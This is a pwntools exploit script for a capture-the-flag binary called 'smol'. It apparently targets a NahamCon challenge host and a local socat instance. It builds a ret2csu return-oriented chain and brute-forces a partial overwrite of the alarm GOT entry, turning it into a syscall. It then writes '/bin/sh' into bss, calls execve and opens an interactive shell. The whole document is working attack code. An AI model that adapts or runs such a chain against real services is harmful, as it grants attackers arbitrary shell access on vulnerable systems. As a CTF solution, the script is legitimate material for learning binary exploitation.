#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./smol')

payload  = b''
payload += 0xc * b'A'

# CSU chain, pro version
# set up regs for alarm -> syscall
pop_rbx_rbp_r12_r13_r14_r15 = 0x4011ca
set_rdx_rsi_rdi_call_r15 = 0x4011b0

payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0) # rbx
payload += p64(1) # rbp to get pass check
payload += p64(0) # r12 -> edi this will be edi stdin for read
payload += p64(binary.got.alarm) # r13 -> rsi pointer to alarm
payload += p64(1) # r14 -> rdx
payload += p64(binary.got.read) # pointer to read
payload += p64(set_rdx_rsi_rdi_call_r15)

# now put /bin/sh in bss
payload += p64(0) # add rsp,0x0
payload += p64(0) # rbx
payload += p64(1) # rbp to get pass check
payload += p64(0) # r12 -> edi this will be edi stdin for read
payload += p64(binary.bss()) # r13 -> rsi pointer to bss
payload += p64(0x3b) # r14 -> rdx (/bin/sh\0) + padding to get rax = 0x3b for syscall
payload += p64(binary.got.read) # pointer to read
payload += p64(set_rdx_rsi_rdi_call_r15)

# rest of payload assume alarm -> syscall, do execve
payload += p64(0) # add rsp,0x0
payload += p64(0) # rbx
payload += p64(1) # rbp to get pass check
payload += p64(binary.bss()) # r12 -> edi this will be rdi
payload += p64(0) # r13 -> rsi
payload += p64(0) # r14 -> rdx 
payload += p64(binary.got.alarm) # pointer to syscall
payload += p64(set_rdx_rsi_rdi_call_r15)

# end of chain pops, well we can ignore since this is end of payload
# but prob not always a good idea
#payload += 7 * p64(0)

b = 0x0
# local and remote values from bruteforce
'''
if args.REMOTE:
	b = 0x28
else:
	b = 0x19
'''

context.log_level = 'WARN'

while b <= 0xff:
	if args.REMOTE:
		p = remote('challenge.nahamcon.com', 31713)
	else:
		# socat TCP-LISTEN:9999,reuseaddr,fork EXEC:$PWD/smol,pty,stderr,setsid,sigint,sane,rawer
		p = remote('localhost', 9999)

	try:
		p.send(payload)
		time.sleep(.1)

		log.warn('testing b=' + hex(b))
		p.send(p8(b)) 
		time.sleep(.1)
		b += 1

		# /bin/sh send padded to 0x3b so rax has syscall number for execve
		p.send(b'/bin/sh\0' + (0x3b-8) * b'A')
		time.sleep(.1)

		p.sendline('echo shell')
		# to catch tty control errors, just lazy and try again
		if b'shell' in p.recvline():
			p.interactive()
			break
		if b'shell' in p.recvline():
			p.interactive()
			break
	except:
		p.close()

